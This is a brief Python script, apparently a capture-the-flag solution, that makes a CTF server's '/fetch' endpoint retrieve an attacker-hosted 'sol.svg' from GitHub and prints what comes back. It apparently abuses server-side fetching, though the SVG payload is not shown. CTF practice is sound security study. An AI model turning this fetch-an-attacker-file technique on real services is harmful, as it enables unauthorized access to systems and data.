import requests

url = "http://nexus-security.club:8001/fetch"
payload = {
    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol.svg"
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
r = requests.post(url, headers=headers, data=payload)


print(r.text)